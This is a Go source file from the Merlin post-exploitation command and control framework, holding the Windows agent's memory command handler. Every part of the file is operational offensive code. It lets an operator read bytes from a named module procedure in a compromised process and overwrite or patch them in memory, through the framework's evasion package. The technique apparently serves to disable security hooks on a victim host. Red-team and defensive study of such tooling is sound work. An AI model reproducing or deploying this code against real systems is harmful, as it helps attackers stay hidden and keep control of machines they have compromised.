//go:build windows

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"

	// Merlin
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/os/windows/pkg/evasion"
)

// Memory is a handler for working with virtual memory on the host operating system
func Memory(cmd jobs.Command) (results jobs.Results) {
	if len(cmd.Args) > 0 {
		cli.Message(cli.SUCCESS, fmt.Sprintf("Memory module command: %s", cmd.Args[0]))
		switch strings.ToLower(cmd.Args[0]) {
		case "read":
			// 0-read, 1-module, 2-procedure, 3-length
			if len(cmd.Args) > 3 {
				length, err := strconv.Atoi(cmd.Args[3])
				if err != nil {
					results.Stderr = fmt.Sprintf("there was an error converting the length to an integer: %s", err)
					return
				}
				data, err := evasion.ReadBanana(cmd.Args[1], cmd.Args[2], length)
				if err != nil {
					results.Stderr = err.Error()
					return
				}
				results.Stdout = fmt.Sprintf("Read %d bytes from %s!%s: %X", length, cmd.Args[1], cmd.Args[2], data)
				return
			} else {
				results.Stderr = fmt.Sprintf("expected 4 arguments but got %d", len(cmd.Args))
				return
			}
		case "patch":
			// 0-patch, 1-module, 2-procedure, 3-patch
			if len(cmd.Args) > 3 {
				patch, err := hex.DecodeString(cmd.Args[3])
				if err != nil {
					results.Stderr = fmt.Sprintf("there was an error decoding the patch to bytes: %s", err)
					return
				}
				out, err := evasion.Patch(cmd.Args[1], cmd.Args[2], &patch)
				results.Stdout = out
				if err != nil {
					results.Stderr = err.Error()
				}
				return
			} else {
				results.Stderr = fmt.Sprintf("expected 4 arguments but got %d", len(cmd.Args))
				return
			}
		case "write":
			// 0-write, 1-module, 2-procedure, 3-patch
			if len(cmd.Args) > 3 {
				patch, err := hex.DecodeString(cmd.Args[3])
				if err != nil {
					results.Stderr = fmt.Sprintf("there was an error decoding the patch to bytes: %s", err)
					return
				}
				err = evasion.WriteBanana(cmd.Args[1], cmd.Args[2], &patch)
				if err != nil {
					results.Stderr = err.Error()
				}
				results.Stdout = fmt.Sprintf("\nWrote %d bytes to %s!%s: %X", len(patch), cmd.Args[1], cmd.Args[2], patch)
				return
			} else {
				results.Stderr = fmt.Sprintf("expected 4 arguments but got %d", len(cmd.Args))
				return
			}
		default:
			results.Stderr = fmt.Sprintf("unrecognized Memory module command: %s", cmd.Args[0])
			return
		}
	}

	results.Stderr = "no arguments were provided to the Memory module"

	return
}
